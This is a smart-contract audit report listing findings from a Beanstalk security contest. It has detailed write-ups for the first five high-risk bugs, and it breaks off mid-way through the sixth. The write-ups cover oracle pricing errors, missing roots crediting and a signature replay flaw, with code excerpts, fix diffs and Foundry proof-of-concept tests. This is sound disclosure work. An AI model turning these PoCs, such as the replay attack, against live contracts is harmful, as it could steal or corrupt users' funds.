# Beanstalk: The Finale - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. `LibChainlinkOracle::getTokenPrice` will always return instantaneuous prices](#H-01)
    - [H-02. LibUsdOracle will compromise Beanstalk peg due to wrong price and DoS](#H-02)
    - [H-03. LibUsdOracle returns the wrong price for Uniswap Oracle](#H-03)
    - [H-04. `ReseedSilo#reseedSiloDeposit` does not credit the user any `roots`](#H-04)
    - [H-05. Successful transactions are not stored, causing a replay attack on ``redeemDepositsAndInternalBalances``](#H-05)
    - [H-06. Internal balances are never actually migrated within `L2ContractMigrationFacet`](#H-06)
    - [H-07. L2ContractMigrationFacet doesn't increase total Stalk and Roots](#H-07)
    - [H-08. User's stalk is overwritten instead of increased within `ReseedSilo`](#H-08)
    - [H-09. Grown Stalk is incorrectly calculated in ReseedSilo](#H-09)
    - [H-10. L2ContractMigrationFacet migrates incorrect amount of Stalk](#H-10)
    - [H-11. `L2ContractMigrationFacet.addMigratedDepositsToAccount()` doesn't update some global balances during the migration.](#H-11)
    - [H-12. Possible loss of user's balances after calling `addMigratedDepositsToAccount()`.](#H-12)
    - [H-13. ReseedSilo doesn't update total balances of Stalk and Roots](#H-13)
    - [H-14. `LibPipelineConvert.executePipelineConvert()` doesn't decrease Grown Stalk when BDV decreases](#H-14)
    - [H-15. ReseedBarn.sol doesn't initialize of `s.sys.fert.recapitalized`](#H-15)
    - [H-16. `s.sys.silo.unripeSettings` are never set after migration which breaks Unripe functionality](#H-16)
    - [H-17. Tokens can get stuck during migration if the L2 side fails leading to loss of funds](#H-17)
    - [H-18. Unfair Penalty Fees in Pipeline Convert](#H-18)
    - [H-19. `ReseedSilo` does not set the necessary user variables](#H-19)
    - [H-20. Refunding ETH to the caller can be exploited using the Tractor component to call any arbitrary function on behalf of the publisher](#H-20)
    - [H-21. All migrated silo users will receive less stalk accounted to their account during silo reseed](#H-21)
    - [H-22. Incorrect calculation of `beanUsdPrice` in LibEvaluate::evalPrice ](#H-22)
- ## Medium Risk Findings
    - [M-01. USD prices dont work for 20 hours per day](#M-01)
    - [M-02. The declaration and use of `LibTractor::BLUEPRINT_TYPE_HASH` are inconsistent with the structure `struct Blueprint`, and the standard is confusing. It is recommended to unify the standard](#M-02)
    - [M-03. `SiloFacet::transferDeposit` does not verify if amount is 0, leading to full withdrawal DoS for any recipient](#M-03)
    - [M-04.  LibUsdOracle is completely broken for the to-deploy L2 chain](#M-04)
    - [M-05. quickSort function does not work as expected, compromising the calculation of Beans per Well to be minted during a flood](#M-05)
    - [M-06. When migrating via `L2ContractMigrationFacet`, user is not minted roots for the newly accrued stalk](#M-06)
    - [M-07. `LibSilo.transferStalk()` uses incorrect formula to roundUp](#M-07)
    - [M-08. `L2ContractMigrationFacet.addMigratedDepositsToAccount()` forfeits "unmowed" rewards from other Silo deposits](#M-08)
    - [M-09. `L2ContractMigrationFacet.addMigratedDepositsToAccount()` doesn't push depositId to `depositIdList`](#M-09)
    - [M-10. ReseedField.sol incorrectly configures Field values because of mistake in storage layout](#M-10)
    - [M-11. Invariable.sol won't save Bean from exploit because of flawed entitlement calculation](#M-11)
    - [M-12. Attacker can spam Plots to victim to cause DOS on Plot transfer](#M-12)
    - [M-13. Orderers will lose their Beans after migration to L2](#M-13)
    - [M-14. Potential Loss of Fertilizer ERC1155 NFTs During L1 to L2 Migration.](#M-14)
    - [M-15. Forcing penalty to users converting by applying sandwich attack](#M-15)
    - [M-16. Improper Domain Separator Hash in _domainSeparatorV4() Function](#M-16)
    - [M-17. Some users would be stuck on the L1 and not be able to migrate their Beans to the L2](#M-17)
    - [M-18. In `transferDeposit` the recipient is able to change the stem to a value to take higher grown stalks from the sender](#M-18)
    - [M-19. Transferring a deposit fully in a rainy season loses the rewards during the flood](#M-19)
    - [M-20. Loss/lock of rewards in case of withdrawing fully before a flood](#M-20)
    - [M-21. Stealing SoP rewards by manipulating the total rain roots during converting](#M-21)
    - [M-22. Allowing the execution of more than a single `sunrise` function when enough time has passed is really dangerous](#M-22)
    - [M-23. If user has not mown since germination, they'll lose their portion of `plenty`](#M-23)
    - [M-24. User will lose the rest of their `plenty` if they fully withdraw during/after `rain`.](#M-24)
    - [M-25. `redeemDepositsAndInternalBalances` should mow before adding migrated deposits](#M-25)
    - [M-26. `fundsSafu` modifier will be useless on L2 before all users have successfully migrated.](#M-26)
    - [M-27. The function to initialize the whitelisted tokens on L2 will revert due to an out of bound error](#M-27)
    - [M-28. Incorrect Loop Counter Increment in `ReseedField` Contract](#M-28)
    - [M-29. The default gauge point function is not used even if selector of ss.gaugePointImplementation is 0](#M-29)
    - [M-30. Cross-Chain Replay Attack Vulnerability in Beanstalk's L2ContractMigrationFacet](#M-30)
    - [M-31. Incorrect conditional in LibUsdOracle leads mal functioning price feeds](#M-31)
- ## Low Risk Findings
    - [L-01.  The `LibWeth` hardcodes the `WETH` address which makes it incompatible on the to-deploy L2 chain](#L-01)
    - [L-02. LibUsdOracle inverses Chainlink TWAP price which results in incorrect price](#L-02)
    - [L-03.  `BeanL1RecieverFacet#recieveL1Beans()` would never work](#L-03)
    - [L-04. Incorrect Hardcoded Block Time Assumptions in Beanstalk's LibDibbler ](#L-04)
    - [L-05. ETH/USD 1 hour period is too large for Optimism/Base L2 Chains and too small for Arbitrum/Avalanche leading to consuming stale price data.](#L-05)
    - [L-06. The `DepotFacet` contract uses an incorrect `PIPELINE` address.](#L-06)
    - [L-07. Cannot configure `temperature` in ReseedField due to type mismatch](#L-07)
    - [L-08. `ReseedBarn.init()` will run out of gas due to minting firtilizers on some L2s](#L-08)
    - [L-09. `LibWell.getBeanTokenPriceFromTwaReserves()` incorrectly assumes that token has 18 decimals](#L-09)
    - [L-10. `LibWell.getWellTwaUsdLiquidityFromReserves()` returns liquidity with incorrect precision](#L-10)
    - [L-11. `LibFertilizer.beginBarnRaiseMigration()` incorrectly checks that Oracle supports such token](#L-11)
    - [L-12. SeasonGettersFacet returns the wrong totalDeltaB](#L-12)
    - [L-13. UsdOracle reverts on tokens which are not wstETH, WETH, Bean](#L-13)
    - [L-14. TractorFacet return the wrong values for Tractor Counter](#L-14)
    - [L-15. Zero reward due to a missing scaling factor](#L-15)
    - [L-16. Permit functions will not work with certain tokens](#L-16)
    - [L-17. Mismatch in the `BRIDGE` address between the `BeanL1RecieverFacet` and `BeanL2MigrationFacet` contracts prevents the migration of Beans to L2](#L-17)
    - [L-18. Mowing between two consecutive floods results in loss of rewards related to the second flood](#L-18)
    - [L-19. Malicious users can delete plots from other users in a specific edge case](#L-19)
    - [L-20. If token get's unwhitelisted, users will be unable to claim the `plenty` they've accrued prior to the unwhitelist](#L-20)
    - [L-21. Hardcoded `MERKLE_ROOT` will make the contract unusable](#L-21)
    - [L-22. `plenty` balances are not migrated on L2 ](#L-22)
    - [L-23. High Risk Denial-of-Service (DoS) Vulnerability in ERC1155 Token Minting Process.](#L-23)
    - [L-24. Difference with variable decoding between `AdvancedPipeCall` and `AdvancedFarmCall`](#L-24)
    - [L-25. Plot allowances should have defined the index and start](#L-25)
    - [L-26. Permit signatures cannot be cancelled by signers before deadline](#L-26)
    - [L-27. Incorrect event emission parameter in TransferBatch event, should use  LibTractor._user()  instead of msg.sender](#L-27)
    - [L-28. ## Duplicate Entries in plotIndexes via `FieldFacet.sow`](#L-28)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: Beanstalk

### Dates: May 30th, 2024 - Jul 8th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-05-beanstalk-the-finale)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 22
   - Medium: 31
   - Low: 28


# High Risk Findings

## <a id='H-01'></a>H-01. `LibChainlinkOracle::getTokenPrice` will always return instantaneuous prices

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [joicygiore](https://profiles.cyfrin.io/u/undefined), [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [emmac002](https://profiles.cyfrin.io/u/undefined), [Draiakoo](https://profiles.cyfrin.io/u/undefined), [crunter](https://profiles.cyfrin.io/u/undefined), [bareli](https://profiles.cyfrin.io/u/undefined), [bladesec](https://profiles.cyfrin.io/u/undefined), [sohrabhind](https://profiles.cyfrin.io/u/undefined), [KalyanSingh2](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `LibChainlinkOracle::getTokenPrice` function has a parameter of `lookback` in order to determine how many seconds ago do we want to obtain the twap of a chainlink price feed. However, this is implemented in a wrong way

## Relevant GitHub Links:
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Oracle/LibChainlinkOracle.sol#L39-L48

## Vulnerability Details

When `LibChainlinkOracle::getTokenPrice` is called, it returns a different price calculation depending on the `lookback` parameter passed to the function:

```Solidity
    function getTokenPrice(
        address priceAggregatorAddress,
        uint256 maxTimeout,
        uint256 lookback
    ) internal view returns (uint256 price) {
        return
            lookback > 0
                ? getPrice(priceAggregatorAddress, maxTimeout)
                : getTwap(priceAggregatorAddress, maxTimeout, lookback);
    }
```

In this case the ternary operator returns the function `getPrice` (instantaneous price) when lookback > 0 and `getTwap` when lookback == 0. As we can see, the conditional for returning the different price computation is wrong because it returns the twap price when lookback = 0, which is basically the instantaneous price and it returns the current price when the lookback parameter is greater than 0, when it should return the twap according to the amount of lookback passed.

The correct behaviour should be that when `lookback` is set to 0, it should return the instantaneous price "`getPrice`" and when it is greater than 0 it should return the "`getTwap`" function passing it the lookback parameter.

## Impact

Medium, no matter what `lookback` will be, the instantaneous price from the chainlink oracle will be returned.

Chainlink is not manipulable but the functionality clearly does not work as intended and can return unexpected results.

## Tools Used

Manual review

## Recommendations

```diff
    function getTokenPrice(
        address priceAggregatorAddress,
        uint256 maxTimeout,
        uint256 lookback
    ) internal view returns (uint256 price) {
        return
-            lookback > 0
+            lookback == 0
                ? getPrice(priceAggregatorAddress, maxTimeout)
                : getTwap(priceAggregatorAddress, maxTimeout, lookback);
    }
```

## <a id='H-02'></a>H-02. LibUsdOracle will compromise Beanstalk peg due to wrong price and DoS

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [joicygiore](https://profiles.cyfrin.io/u/undefined), [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [KalyanSingh2](https://profiles.cyfrin.io/u/undefined). Selected submission by: [holydevoti0n](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details

The function `getUsdPrice`from `LibUsdOracle` should return the token value in USD.  For example, one of its consumers is the function [`getMintFertilizerOut`](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/beanstalk/barn/FertilizerFacet.sol#L117-L122):

`fertilizerAmountOut = tokenAmountIn.div(LibUsdOracle.getUsdPrice(barnRaiseToken));`

The goal of this function is to return the fertilizer amount with 0 decimals, therefore if the WETH value is at \$1000 and the user would provide 1 WETH:

`tokenAmountIn = 1e18.div(1e15) = 1e3 = 1000`

Another critical use case for `getUsdPrice` is: fetching the ratios to calculate the deltaB.

```solidity
 function getRatiosAndBeanIndex(
        IERC20[] memory tokens,
        uint256 lookback
    ) internal view returns (uint[] memory ratios, uint beanIndex, bool success) {
        success = true;
        ratios = new uint[](tokens.length);
        beanIndex = type(uint256).max;
        for (uint i; i < tokens.length; ++i) {
            if (C.BEAN == address(tokens[i])) {
                beanIndex = i;
                ratios[i] = 1e6;
            } else {
@>                ratios[i] = LibUsdOracle.getUsdPrice(address(tokens[i]), lookback); // @audit expect value return in USD
                if (ratios[i] == 0) {
                    success = false;
                }
            }
        }
        require(beanIndex != type(uint256).max, "Bean not in Well.");
    }
```

The function `getRatiosAndBeanIndex` is used throughout the system, including in processes like `Sunrise` and `Convert`, to help Bean maintain its peg.

* The first issue is that the price returned by `getUsdPrice` will be incorrect for tokens that use "external oracle" due to the duplicated division using `1e24`.

```solidity
// getUsdPrice

@>        uint256 tokenPrice = getTokenPriceFromExternal(token, lookback);
        if (tokenPrice == 0) return 0;
@>        return uint256(1e24).div(tokenPrice);


// getTokenPriceFromExternal

//returns uint256(1e24).div(result from chainlink with 6 decimals)
            return
@>                uint256(1e24).div(
                    LibChainlinkOracle.getTokenPrice(
                        chainlinkOraclePriceAddress,
                        LibChainlinkOracle.FOUR_HOUR_TIMEOUT,
                        lookback
                    )
                );

```

This will result in an inaccurate price. For example, when the price of WBTC is \$50,000, it will return `50000e6` instead of the correct value `2e13`. This discrepancy will cause Beanstalk to consider an erroneous ratio, resulting in an incorrect DeltaB.

Beanstalk uses deltaB to determine:

* Whether the system is Above or below the peg
* Sow and Pods(issuing debt)
* Flood
* Convert

In a nutshell, all components from Beanstalk will be affected by DeltaBs originating from tokens using Oracle with encodedType `0x01`. 

* The second issue is that the `getTokenPriceFromExternal` doesn't check for the return from the Oracle value before div:

```solidity
 return
@>                uint256(1e24).div(
                    LibChainlinkOracle.getTokenPrice(
                        chainlinkOraclePriceAddress,
                        LibChainlinkOracle.FOUR_HOUR_TIMEOUT,
                        lookback
                    )
                );
```

When the Chainlink Oracle fails to fetch the price it returns 0. Hence, the function will revert due to `uint256(1e24).div(0)`.

## PoC

1. For the incorrect price:

Add the following test on `oracle.t.sol`

```solidity
function test_getUsdPrice_whenExternalToken_priceIsInvalid() public {
        // pre condition: encode type 0x01 

        // WETH price is 1000
        uint256 priceWETH = OracleFacet(BEANSTALK).getUsdPrice(C.WETH);
        assertEq(priceWETH, 1e15);  //  1e18/1e3 = 1e15

        // WBTC price is 50000
        uint256 priceWBTC = OracleFacet(BEANSTALK).getUsdPrice(WBTC);
        assertEq(priceWBTC, 2e13); // 1e24.div(50000e6) = 2e13
    }
```

Run: `forge test --match-test test_getUsdPrice_whenExternalToken_priceIsInvalid`

Output:

```javascript
Failing tests:
Encountered 1 failing test in test/foundry/silo/oracle.t.sol:OracleTest
[FAIL. Reason: assertion failed: 50000000000 != 20000000000000] test_getUsdPrice_whenExternalToken_priceIsInvalid() (gas: 64594)
```

1. For the DoS when Chainlink oracle returns 0:
   Add this test on `oracle.t.sol`

```solidity
// first -  import {MockChainlinkAggregator} from "contracts/mocks/chainlink/MockChainlinkAggregator.sol";

function test_getUsdPrice_willDoS_whenOracleFail() public { 
        // pre condition: encode type 0x01 and oracle fail
        MockChainlinkAggregator(WBTC_USD_CHAINLINK_PRICE_AGGREGATOR).setOracleFailure();

        // action
        vm.expectRevert();
        OracleFacet(BEANSTALK).getUsdPrice(WBTC);
    }
```

Run: `forge test --match-test test_getUsdPrice_willDoS_whenOracleFail`

Output:

```javascript
Ran 1 test for test/foundry/silo/oracle.t.sol:OracleTest
[PASS] test_getUsdPrice_willDoS_whenOracleFail() (gas: 21500)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 259.13ms
```

## Impact

High.

* Incorrect price: This will compromise the entire system, as all peg-related components, including Sunrise and Convert, depend on the price.
* DoS: Sunrise will revert and disrupt all other components that rely on the price.  The risk of a DoS is increased due to `stepOracle` calling multiple tokens(instead of one as previously) to fetch their prices, raising the chances of an Oracle failure.

## Tools Used

Manual Review & Foundry

## Recommendations

* To fix both issues: On `getTokenPriceFromExternal` return the price from Chainlink directly, instead of scaling it.

```diff
return LibChainlinkOracle.getTokenPrice(
                        chainlinkOraclePriceAddress,
                        LibChainlinkOracle.FOUR_HOUR_TIMEOUT,
                        lookback
                    );
```

## <a id='H-03'></a>H-03. LibUsdOracle returns the wrong price for Uniswap Oracle

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [holydevoti0n](https://profiles.cyfrin.io/u/undefined), [KalyanSingh2](https://profiles.cyfrin.io/u/undefined). Selected submission by: [holydevoti0n](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details

The Generalised Oracle is broken for the external tokens that use Uniswap. This is happening for two reasons: 

1. The token passed as a base token for the `OracleLibrary.getQuoteAtTick` is incorrect. The base token should be the token the protocol wants to fetch the price from, not the quote token. Take into consideration the following scenario: Fetching the price for WBTC. 

```Solidity
            // LibUsdOracle -> getTokenPriceFromExternal
            address chainlinkToken = IUniswapV3PoolImmutables(oracleImpl.target).token0();
            chainlinkToken = chainlinkToken == token
                ? IUniswapV3PoolImmutables(oracleImpl.target).token1()
                : token;
            tokenPrice = LibUniswapOracle.getTwap(
                lookback == 0 ? LibUniswapOracle.FIFTEEN_MINUTES : uint32(lookback),
                oracleImpl.target,
@>                chainlinkToken, // @audit baseToken: chainlinkToken is USDC
                token, // @audit quoteToken - WBTC
                uint128(10) ** uint128(IERC20Decimals(token).decimals()) // @audit base token amount
```

The function getTwap: 

```Solidity
    function getTwap(
        uint32 lookback,
        address pool,
        address token1, // @audit USDC
        address token2, // @audit WBTC
        uint128 oneToken // @audit 1e8
    ) internal view returns (uint256 price) {
        (bool success, int24 tick) = consult(pool, lookback);
        if (!success) return 0;
@>        price = OracleLibrary.getQuoteAtTick(tick, oneToken, token1, token2); // @audit token1 == USDC 
    }
```

Due to this, the protocol is trying to fetch the price of the amount 1e8 in USDC, using as quote price `WBTC`, instead of the intended behavior that should be quoting the price of 1 WBTC(1e8) in USDC. 

* The second issue is that the `getTwap` function can return values with varying decimals. The protocol assumes a 6-decimal return value, but some stablecoins, like `DAI`, have 18 decimals.

Notice that at the end of the flow for returning the price on the `getTokenPriceFromExternal` the token price is divided by 6.

```Solidity
  uint256 chainlinkTokenPrice = LibChainlinkOracle.getTokenPrice(
                chainlinkOraclePriceAddress,
                LibChainlinkOracle.FOUR_HOUR_TIMEOUT,
                lookback
            );
  return tokenPrice.mul(chainlinkTokenPrice).div(1e6); // @audit assume uniswap price is 6 decimals 
```

If the quote token is DAI, for instance, the value will be significantly higher than expected in the `LibUsdOracle`. All other oracles in the protocol, such as `LibChainlinkOracle` and `LibWsethUsdOracle`, return values based on 6 decimals. The `LibUniswapOracle` has worked well so far because Beanstalk hasn't introduced stablecoins with decimals != 6. Therefore, the `getTwap` function should be modified to return values quoted with 6 decimals.

## Impact

* LibUsdOracle can't return the correct price for any external token using Uniswap as Oracle. 

## Tools Used

Manual Review

## Recommendations

1. 1st: Use `token` as the base token to ensure the `chainlinkToken` (quote token) returns the correct price.

```diff

            tokenPrice = LibUniswapOracle.getTwap(
                lookback == 0 ? LibUniswapOracle.FIFTEEN_MINUTES : uint32(lookback),
                oracleImpl.target,
-                chainlinkToken,
-                token,
+                token,
+                chainlinkToken,
                uint128(10) ** uint128(IERC20Decimals(token).decimals())
            );
```

* 2nd: Modify the `getTwap` function to always return the value in 6 decimal precision. Additionally, rename the variables for better clarity and usability.

```diff
+   uint256 constant PRECISION = 1e6;
+
+ /**
+ * @notice Given a tick and a token amount, calculates the amount of token received in exchange
+ * @param baseTokenAmount Amount of baseToken to be converted.
+ * @param baseToken Address of the ERC20 token contract used as the baseAmount denomination.
+ * @param quoteToken Address of the ERC20 token contract used as the quoteAmount denomination.
+ * @return price Amount of quoteToken. Value has 6 decimal precision.
+ */
function getTwap(
        uint32 lookback,
        address pool,
-        address token1,
-        address token2,
-        uint128 oneToken
+        address baseToken,
+        address quoteToken,
+        uint128 baseTokenAmount
    ) internal view returns (uint256 price) {
        (bool success, int24 tick) = consult(pool, lookback);
        if (!success) return 0;
-        price = OracleLibrary.getQuoteAtTick(tick, oneToken, token1, token2);
+        price = OracleLibrary.getQuoteAtTick(tick, baseTokenAmount, baseToken, quoteToken);

+         uint256 baseTokenDecimals = IERC20Decimals(baseToken).decimals();
+         uint256 quoteTokenDecimals = IERC20Decimals(quoteToken).decimals();
+         int256 factor = int256(baseTokenDecimals) - int256(quoteTokenDecimals);
+          
+         // decimals are the same. i.e. DAI/WETH
+         if (factor == 0) return price.mul(PRECISION).div(baseTokenDecimals);
+
+        // scale decimals
+        if (factor > 0) {
+            price = price.mul(10 ** uint256(factor));
+        } else {
+            price = price.div(10 ** uint256(-factor));
+        }
+
+        // set 1e6 precision
+        price.mul(PRECISION).div(baseTokenDecimals);

    }
```

Unit tests 

* Change the `OracleDeployer` file to use the correct values(ticks, price) for the pools. The values for the WBTC/USDC for instance are not correct, which leads to a faulty test on `oracle.t.sol`to pass. This data can be extracted here: <https://etherscan.io/address/0x99ac8cA7087fA4A2A1FB6357269965A2014ABc35#readContract>

## <a id='H-04'></a>H-04. `ReseedSilo#reseedSiloDeposit` does not credit the user any `roots`

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

`ReseedSilo#reseedSiloDeposit` does not credit the user any `roots`

## Vulnerability Details

Usually, when users are minted `stalk`, they're also minted `roots` at the current Silo ratio.

However, within `reseedSiloDeposit`, `roots` are never actually calculated/set.

```solidity
            // increment stalkForAccount by the stalk issued per BDV.
            // placed outside of loop for gas effiency.
            accountStalk += stalkIssuedPerBdv * totalBdvForAccount;

            // set stalk for account.
            s.accts[deposits.accounts].stalk = accountStalk;
        }
```

As this would also increase the `roots : stalk` ratio, this would allow for unfair minting of Beans

## Impact

Loss of roots and Beans

## Tools Used

Manual review

## Recommendations

Mint roots at the current silo ratio

## <a id='H-05'></a>H-05. Successful transactions are not stored, causing a replay attack on ``redeemDepositsAndInternalBalances``

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [asefewwexa](https://profiles.cyfrin.io/u/undefined), [PutraLaksmana](https://profiles.cyfrin.io/u/undefined). Selected submission by: [PutraLaksmana](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

in `redeemDepositsAndInternalBalances` there is no validation about the parameters that have been used which should be stored and should not be reused.

As a result, parameters that have already been used can be reused.

## Vulnerability Details

Look at this:

```solidity
function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof,
        uint256 deadline,
        bytes calldata signature
    ) external payable fundsSafu noSupplyChange nonReentrant {
        // verify deposits are valid.
        // note: if the number of contracts that own deposits is small,
        // deposits can be stored in bytecode rather than relying on a merkle tree.
        verifyDepositsAndInternalBalances(owner, deposits, internalBalances, ownerRoots, proof);

        // signature verification.
        verifySignature(owner, reciever, deadline, signature);

function verifyDepositsAndInternalBalances(
        address account,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof
    ) internal pure {
        bytes32 leaf = keccak256(abi.encode(account, deposits, internalBalances, ownerRoots));
        require(MerkleProof.verify(proof, MERKLE_ROOT, leaf), "Migration: invalid proof");
    }
function verifySignature(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) internal view {
        require(block.timestamp <= deadline, "Migration: permit expired deadline");
        bytes32 structHash = keccak256(
            abi.encode(REDEEM_DEPOSIT_TYPE_HASH, owner, reciever, deadline)
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Migration: permit invalid signature");
    }
```

In `verifyDepositsAndInternalBalances`, `leaf` is not stored, and there are no checks to ensure that `leaf` is only used once.

This means that parameters that have been filled in `verifyDepositsAndInternalBalances` and succeeded, can be reused.

And `verifySignature` also has no checks to ensure that the `signature` is only used once.

`verifySignature` prevents replay attacks by relying solely on `deadline`, which is bad.

See this:
`require(block.timestamp <= deadline, "Migration: permission deadline expired");`

So, `deadline` is always greater than `block.timestamp` for success.

Even if `block.timestamp` reaches the deadline or is smaller than `block.timestamp`, the owner can sign again to execute a replay attack. This is because `verifyDepositsAndInternalBalances` does not prevent replay attacks and there is no access control on `redeemDepositsAndInternalBalances`.

The vulnerabilities present in the `verifyDepositAndInternalBalance` and `verifySignature` functions make replay attacks unavoidable.

#### POC

Due to difficulty finding the same `MERKLE_ROOT` value as the `L2ContractMigrationFacet` contract.

So, this PoC only proved a simple `signature` replay of `L2ContractMigrationFacet`.

Then the bug in `verifyDepositsAndInternalBalances` can be proven by yourself with a replay attack scheme, since only you know the "leaves" of `MERKLE_ROOT` in the `L2ContractMigrationFacet` contract.

* paste this code on dir/test of new foundry project

- don't forget to install dependencies such as `forge-std` and `openzeppelin`

* run with `forge test -vvvv`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract PocTest is Test {
    using ECDSA for bytes32;

    L2ContractMigrationFacet_simple L2CMF_Op;

    uint256 internal signerPrivateKey;

    uint256 optimismFork;

    bytes32 private constant REDEEM_DEPOSIT_TYPE_HASH =
        keccak256(
            "redeemDepositsAndInternalBalances(address owner,address reciever,uint256 deadline)"
        );

    function setUp() public {
        optimismFork = vm.createSelectFork("https://rpc.ankr.com/optimism", 122288540);
        L2CMF_Op = new L2ContractMigrationFacet_simple();
    }
      function test_poc_replay_attack() public {
        vm.selectFork(optimismFork);
        signerPrivateKey = 0xabc123;
        address signer = vm.addr(signerPrivateKey);
        address owner = signer;
        address reciever = makeAddr("reciever");
        uint256 deadline = block.timestamp + 7 days;

        bytes32 structHash = keccak256(
            abi.encode(REDEEM_DEPOSIT_TYPE_HASH, owner, reciever, deadline)
        );
        vm.startPrank(signer);
        bytes32 hash = L2CMF_Op._hashTypedDataV4(structHash);
       (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        L2CMF_Op.redeemDepositsAndInternalBalances(owner, reciever, deadline, signature);
        
        console.log("..Replay attack");
        vm.warp(block.timestamp + 4200);
        L2CMF_Op.redeemDepositsAndInternalBalances(owner, reciever, deadline, signature);
      }
}

contract L2ContractMigrationFacet_simple is ReentrancyGuard {
    bytes32 private constant MIGRATION_HASHED_NAME =
        keccak256(bytes("Migration"));
    bytes32 private constant MIGRATION_HASHED_VERSION = keccak256(bytes("1"));
    bytes32 private constant EIP712_TYPE_HASH =
        keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
    bytes32 private constant REDEEM_DEPOSIT_TYPE_HASH =
        keccak256(
            "redeemDepositsAndInternalBalances(address owner,address reciever,uint256 deadline)"
        );

    function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) external payable nonReentrant {
        verifySignature(owner, reciever, deadline, signature);
    }

    function verifySignature(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) internal view {
        require(
            block.timestamp <= deadline,
            "Migration: permit expired deadline"
        );
        bytes32 structHash = keccak256(
            abi.encode(REDEEM_DEPOSIT_TYPE_HASH, owner, reciever, deadline)
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Migration: permit invalid signature");
    }

    function _hashTypedDataV4(
        bytes32 structHash
    ) public view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19\x01", _domainSeparatorV4(), structHash)
            );
    }

    /**
     * @notice Returns the domain separator for the current chain.
     */
    function _domainSeparatorV4() internal view returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    EIP712_TYPE_HASH,
                    MIGRATION_HASHED_NAME,
                    MIGRATION_HASHED_VERSION,
                    1, // C.getLegacyChainId()
                    address(this)
                )
            );
    }
}

```

## Impact

look at this code:

```solidity
 uint256 accountStalk;
        for (uint256 i; i < deposits.length; i++) {
            accountStalk += addMigratedDepositsToAccount(reciever, deposits[i]);
        }

        // set stalk for account.
        setStalk(reciever, accountStalk, ownerRoots);

///////////////////////////////////////////////////////

function setStalk(address account, uint256 accountStalk, uint256 accountRoots) internal {
        s.accts[account].stalk += accountStalk;
        s.accts[account].roots += accountRoots;

        // emit event.
        emit StalkBalanceChanged(account, int256(accountStalk), int256(accountRoots));
    }

```

* Attacker can perfrom replay attack and increase of value of `stalk` and `roots`

## Tools Used

Manual

## Recommendations

```solidity
    mapping(bytes32 leaf => bool redeemed) public isRedeemed;

 function verifyDepositsAndInternalBalances(
        address account,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof
    ) internal pure {
        bytes32 leaf = keccak256(abi.encode(account, deposits, internalBalances, ownerRoots));
        if (isRedeemed[leaf]) revert REDEEMED_ALREADY();
        require(MerkleProof.verify(proof, MERKLE_ROOT, leaf), "Migration: invalid proof");
        isRedeemed[leaf] = true;
}

```

And also do that in `verifySignature` ensure that can't be front running attack, like add access control or nonces

## <a id='H-06'></a>H-06. Internal balances are never actually migrated within `L2ContractMigrationFacet`

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined). Selected submission by: [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`L2ContractMigrationFacet` never migrates internal balances.

## Vulnerability Details
 `L2ContractMigrationFacet#redeemDepositsAndInternalBalances` should ideally migrate both user's deposits and internal balances. The user inputs both of them and they're used in the merkle leaf

```solidity
    function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof,
        uint256 deadline,
        bytes calldata signature
    ) external payable fundsSafu noSupplyChange nonReentrant {
        // verify deposits are valid.
        // note: if the number of contracts that own deposits is small,
        // deposits can be stored in bytecode rather than relying on a merkle tree.
        verifyDepositsAndInternalBalances(owner, deposits, internalBalances, ownerRoots, proof);

        // signature verification.
